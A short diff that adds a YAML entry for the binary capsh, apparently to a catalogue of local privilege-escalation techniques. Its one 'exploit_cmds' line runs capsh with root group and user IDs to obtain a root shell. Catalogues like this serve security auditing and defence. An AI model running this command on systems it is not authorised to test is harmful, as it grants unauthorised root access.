@@ -1,0 +1,4 @@
+name: capsh
+binary_path: /usr/sbin/capsh
+exploit_cmds:
+- /usr/sbin/capsh --gid=0 --uid=0 --
